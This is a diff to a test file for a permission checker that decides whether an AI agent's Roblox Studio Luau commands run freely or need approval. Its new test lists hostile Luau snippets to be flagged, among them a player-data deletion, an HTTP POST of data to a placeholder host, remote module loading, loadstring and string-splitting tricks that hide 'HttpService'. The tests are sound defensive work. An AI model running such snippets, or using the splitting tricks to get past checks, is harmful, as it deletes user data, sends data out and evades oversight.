@@ -136,10 +136,29 @@ test('network: web access asks and can never be always-allowed', () => {
 test('Studio tools: read-only ones are allowed only when Hangar connects Studio itself', () => {
   assert.equal(evalTool('mcp__Roblox_Studio__get_console_output', {}).action, 'allow')
   assert.equal(evalTool('mcp__Roblox_Studio__get_console_output', {}, { ...settings, robloxStudioMcp: false }).action, 'ask')
-  assert.equal(evalTool('mcp__Roblox_Studio__execute_luau', { code: 'print(1)' }).action, 'ask')
+  assert.equal(evalTool('mcp__Roblox_Studio__execute_luau', { code: 'print(1)' }).action, 'allow', 'edit-mode Luau runs without asking')
+  assert.equal(evalTool('mcp__Roblox_Studio__execute_luau', { code: 'workspace.Part.Color = Color3.new(1,0,0)' }).action, 'allow')
+  assert.equal(evalTool('mcp__Roblox_Studio__execute_luau', { code: 'print(1)' }, { ...settings, robloxStudioMcp: false }).action, 'ask', 'only Hangar\'s own Studio connection')
   assert.equal(evalTool('mcp__Roblox_Studio__insert_asset', {}).action, 'ask')
   const s2 = { ...settings, alwaysAllowTools: ['mcp__Roblox_Studio__execute_luau'] }
   assert.equal(evalTool('mcp__Roblox_Studio__execute_luau', {}, s2).action, 'allow')
+})
+
+test('Studio: edit-mode Luau that reaches outside the place still asks in red', () => {
+  const luau = (code: string) => evalTool('mcp__Roblox_Studio__execute_luau', { code })
+  for (const code of [
+    'game:GetService("DataStoreService"):GetDataStore("Players"):RemoveAsync("1")',
+    'game:GetService("HttpService"):PostAsync("https://x.example", "data")',
+    'game:GetService("MessagingService"):PublishAsync("t", 1)',
+    'require(123456789)',
+    'game:GetService("InsertService"):LoadAsset(1)',
+    'loadstring("print(1)")()',
+    'local s = "Http".."Service"; game:GetService(s)',
+    'game:GetService("Http" .. "Service")',
+    'getfenv()["game"]'
+  ]) {
+    assert.ok(isDanger(luau(code)), code)
+  }
 })
 
 test('M3: hidden or direction-changing characters are flagged', () => {
@@ -188,7 +207,7 @@ test('re-audit M-new-1: whole-tool "always" is only offered for Studio tools', (
   assert.equal(unknown.action === 'ask' && unknown.canAlwaysAllow, false)
   const otherMcp = evalTool('mcp__someserver__run_code', { code: 'x' })
   assert.equal(otherMcp.action === 'ask' && otherMcp.canAlwaysAllow, false)
-  const studio = evalTool('mcp__Roblox_Studio__execute_luau', { code: 'x' })
+  const studio = evalTool('mcp__Roblox_Studio__insert_asset', { assetId: 1 })
   assert.equal(studio.action === 'ask' && studio.canAlwaysAllow, true)
 })
 
